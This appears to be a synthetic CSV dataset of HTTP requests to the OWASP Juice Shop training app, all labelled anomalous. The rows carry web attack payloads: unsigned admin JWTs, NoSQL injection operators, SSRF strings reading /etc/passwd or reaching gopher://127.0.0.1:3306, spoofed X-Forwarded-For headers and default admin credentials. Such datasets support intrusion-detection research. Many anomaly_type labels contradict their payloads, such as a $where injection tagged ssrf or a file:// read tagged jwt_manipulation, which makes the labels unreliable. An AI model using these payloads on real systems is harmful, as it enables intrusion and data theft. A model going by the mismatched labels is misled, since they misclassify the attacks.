request_id,timestamp,method,url,headers,body,app_target,anomaly_type,label
466,2025-12-04 5:30:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",file:///etc/passwd,Juice Shop,jwt_manipulation,anomalous
467,2025-12-04 5:40:00,GET,http://juice-sh.op:3000/ftp/upload?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,"{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
468,2025-12-04 5:50:00,GET,http://juice-sh.op:3000/rest/user/login?q=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,"{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
469,2025-12-04 6:00:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""email"":""admin@juice-sh.op"",""password"":""admin123""}",Juice Shop,jwt_manipulation,anomalous
470,2025-12-04 6:10:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,ssrf,anomalous
471,2025-12-04 6:20:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""email"":""admin@juice-sh.op"",""password"":""admin123""}",Juice Shop,nosql_injection,anomalous
472,2025-12-04 6:30:00,GET,http://juice-sh.op:3000/rest/user/profile?q=file:///etc/passwd,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
473,2025-12-04 6:40:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,ssrf,anomalous
474,2025-12-04 6:50:00,GET,http://juice-sh.op:3000/ftp/upload?q=file:///etc/passwd,"{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
475,2025-12-04 7:00:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,ssrf,anomalous
476,2025-12-04 7:10:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,Juice Shop,nosql_injection,anomalous
477,2025-12-04 7:20:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,jwt_manipulation,anomalous
478,2025-12-04 7:30:00,GET,http://juice-sh.op:3000/rest/user/profile?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,"{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
479,2025-12-04 7:40:00,GET,"http://juice-sh.op:3000/rest/user/profile?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
480,2025-12-04 7:50:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",file:///etc/passwd,Juice Shop,jwt_manipulation,anomalous
481,2025-12-04 8:00:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,jwt_manipulation,anomalous
482,2025-12-04 8:10:00,GET,http://juice-sh.op:3000/api/Products?q=gopher://127.0.0.1:3306/_admin,"{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
483,2025-12-04 8:20:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,ssrf,anomalous
484,2025-12-04 8:30:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,nosql_injection,anomalous
485,2025-12-04 8:40:00,GET,"http://juice-sh.op:3000/rest/user/login?q={""email"":""admin@juice-sh.op"",""password"":""admin123""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
486,2025-12-04 8:50:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",file:///etc/passwd,Juice Shop,ssrf,anomalous
487,2025-12-04 9:00:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",gopher://127.0.0.1:3306/_admin,Juice Shop,nosql_injection,anomalous
488,2025-12-04 9:10:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,ssrf,anomalous
489,2025-12-04 9:20:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,ssrf,anomalous
490,2025-12-04 9:30:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,jwt_manipulation,anomalous
491,2025-12-04 9:40:00,GET,http://juice-sh.op:3000/rest/user/profile?q=file:///etc/passwd,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
492,2025-12-04 9:50:00,GET,"http://juice-sh.op:3000/rest/user/login?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
493,2025-12-04 10:00:00,GET,http://juice-sh.op:3000/rest/admin/configuration?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,"{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
494,2025-12-04 10:10:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
495,2025-12-04 10:20:00,GET,"http://juice-sh.op:3000/rest/basket?q={""email"":""admin@juice-sh.op"",""password"":""admin123""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
496,2025-12-04 10:30:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
497,2025-12-04 10:40:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,jwt_manipulation,anomalous
498,2025-12-04 10:50:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",gopher://127.0.0.1:3306/_admin,Juice Shop,jwt_manipulation,anomalous
499,2025-12-04 11:00:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
500,2025-12-04 11:10:00,GET,"http://juice-sh.op:3000/api/Users?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
501,2025-12-04 11:20:00,GET,http://juice-sh.op:3000/rest/user/profile?q=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
502,2025-12-04 11:30:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,nosql_injection,anomalous
503,2025-12-04 11:40:00,GET,"http://juice-sh.op:3000/rest/user/login?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
504,2025-12-04 11:50:00,GET,"http://juice-sh.op:3000/rest/basket?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
505,2025-12-04 12:00:00,POST,http://juice-sh.op:3000/rest/user/login,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,jwt_manipulation,anomalous
506,2025-12-04 12:10:00,GET,"http://juice-sh.op:3000/rest/admin/configuration?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
507,2025-12-04 12:20:00,GET,"http://juice-sh.op:3000/api/Users?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
508,2025-12-04 12:30:00,GET,http://juice-sh.op:3000/rest/basket?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
509,2025-12-04 12:40:00,GET,"http://juice-sh.op:3000/rest/user/profile?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
510,2025-12-04 12:50:00,GET,http://juice-sh.op:3000/api/Products?q=gopher://127.0.0.1:3306/_admin,"{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
511,2025-12-04 13:00:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,nosql_injection,anomalous
512,2025-12-04 13:10:00,GET,http://juice-sh.op:3000/ftp/upload?q=file:///etc/passwd,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
513,2025-12-04 13:20:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,jwt_manipulation,anomalous
514,2025-12-04 13:30:00,GET,"http://juice-sh.op:3000/api/Users?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
515,2025-12-04 13:40:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
516,2025-12-04 13:50:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
517,2025-12-04 14:00:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,nosql_injection,anomalous
518,2025-12-04 14:10:00,GET,"http://juice-sh.op:3000/rest/basket?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
519,2025-12-04 14:20:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,nosql_injection,anomalous
520,2025-12-04 14:30:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,ssrf,anomalous
521,2025-12-04 14:40:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,jwt_manipulation,anomalous
522,2025-12-04 14:50:00,GET,"http://juice-sh.op:3000/rest/admin/configuration?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
523,2025-12-04 15:00:00,GET,http://juice-sh.op:3000/api/Products?q=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
524,2025-12-04 15:10:00,POST,http://juice-sh.op:3000/rest/user/login,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""email"":""admin@juice-sh.op"",""password"":""admin123""}",Juice Shop,ssrf,anomalous
525,2025-12-04 15:20:00,GET,"http://juice-sh.op:3000/rest/user/login?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
526,2025-12-04 15:30:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,nosql_injection,anomalous
527,2025-12-04 15:40:00,GET,"http://juice-sh.op:3000/rest/user/profile?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
528,2025-12-04 15:50:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,Juice Shop,ssrf,anomalous
529,2025-12-04 16:00:00,GET,http://juice-sh.op:3000/api/Products?q=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,"{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
530,2025-12-04 16:10:00,GET,"http://juice-sh.op:3000/api/Users?q={""$ne"":null}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
531,2025-12-04 16:20:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
532,2025-12-04 16:30:00,GET,http://juice-sh.op:3000/api/Users?q=gopher://127.0.0.1:3306/_admin,"{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
533,2025-12-04 16:40:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,nosql_injection,anomalous
534,2025-12-04 16:50:00,GET,"http://juice-sh.op:3000/rest/basket?q={""email"":""admin@juice-sh.op"",""password"":""admin123""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
535,2025-12-04 17:00:00,GET,"http://juice-sh.op:3000/rest/admin/configuration?q={""email"":""admin@juice-sh.op"",""password"":""admin123""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
536,2025-12-04 17:10:00,POST,http://juice-sh.op:3000/rest/user/login,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""email"":""admin@juice-sh.op"",""password"":""admin123""}",Juice Shop,ssrf,anomalous
537,2025-12-04 17:20:00,GET,"http://juice-sh.op:3000/ftp/upload?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
538,2025-12-04 17:30:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.invalid,Juice Shop,ssrf,anomalous
539,2025-12-04 17:40:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,nosql_injection,anomalous
540,2025-12-04 17:50:00,POST,http://juice-sh.op:3000/rest/basket,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,jwt_manipulation,anomalous
541,2025-12-04 18:00:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,nosql_injection,anomalous
542,2025-12-04 18:10:00,GET,"http://juice-sh.op:3000/api/Users?q={""email"":""admin@juice-sh.op"",""password"":""admin123""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
543,2025-12-04 18:20:00,GET,"http://juice-sh.op:3000/rest/user/profile?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
544,2025-12-04 18:30:00,GET,"http://juice-sh.op:3000/rest/user/login?q={""email"":""admin@juice-sh.op"",""password"":""admin123""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
545,2025-12-04 18:40:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,ssrf,anomalous
546,2025-12-04 18:50:00,GET,http://juice-sh.op:3000/rest/user/profile?q=gopher://127.0.0.1:3306/_admin,"{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
547,2025-12-04 19:00:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,jwt_manipulation,anomalous
548,2025-12-04 19:10:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""email"":""admin@juice-sh.op"",""password"":""admin123""}",Juice Shop,nosql_injection,anomalous
549,2025-12-04 19:20:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$ne"":null}",Juice Shop,ssrf,anomalous
550,2025-12-04 19:30:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,nosql_injection,anomalous
551,2025-12-04 19:40:00,GET,"http://juice-sh.op:3000/api/Products?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
552,2025-12-04 19:50:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$where"":""this.price < 0""}",Juice Shop,nosql_injection,anomalous
553,2025-12-04 20:00:00,POST,http://juice-sh.op:3000/api/Products,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,ssrf,anomalous
554,2025-12-04 20:10:00,POST,http://juice-sh.op:3000/rest/admin/configuration,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,nosql_injection,anomalous
555,2025-12-04 20:20:00,POST,http://juice-sh.op:3000/ftp/upload,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""$regex"":"".*""}",Juice Shop,nosql_injection,anomalous
556,2025-12-04 20:30:00,GET,"http://juice-sh.op:3000/rest/user/profile?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
557,2025-12-04 20:40:00,POST,http://juice-sh.op:3000/api/Users,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",file:///etc/passwd,Juice Shop,nosql_injection,anomalous
558,2025-12-04 20:50:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,jwt_manipulation,anomalous
559,2025-12-04 21:00:00,GET,http://juice-sh.op:3000/rest/user/profile?q=file:///etc/passwd,"{""Content-Type"": ""application/json""}",,Juice Shop,ssrf,anomalous
560,2025-12-04 21:10:00,GET,"http://juice-sh.op:3000/rest/admin/configuration?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
561,2025-12-04 21:20:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}",eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.,Juice Shop,nosql_injection,anomalous
562,2025-12-04 21:30:00,GET,"http://juice-sh.op:3000/rest/user/profile?q={""$where"":""this.price < 0""}","{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
563,2025-12-04 21:40:00,GET,"http://juice-sh.op:3000/rest/basket?q={""$regex"":"".*""}","{""Content-Type"": ""application/json""}",,Juice Shop,jwt_manipulation,anomalous
564,2025-12-04 21:50:00,POST,http://juice-sh.op:3000/rest/user/profile,"{""Authorization"": ""Bearer eyJhbGciOiJSUzI1NiJ9.invalid"", ""Content-Type"": ""application/json"", ""X-Forwarded-For"": ""127.0.0.1""}","{""email"":""admin@juice-sh.op"",""password"":""admin123""}",Juice Shop,nosql_injection,anomalous
565,2025-12-04 22:00:00,GET,http://juice-sh.op:3000/ftp/upload?q=file:///etc/passwd,"{""Content-Type"": ""application/json""}",,Juice Shop,nosql_injection,anomalous
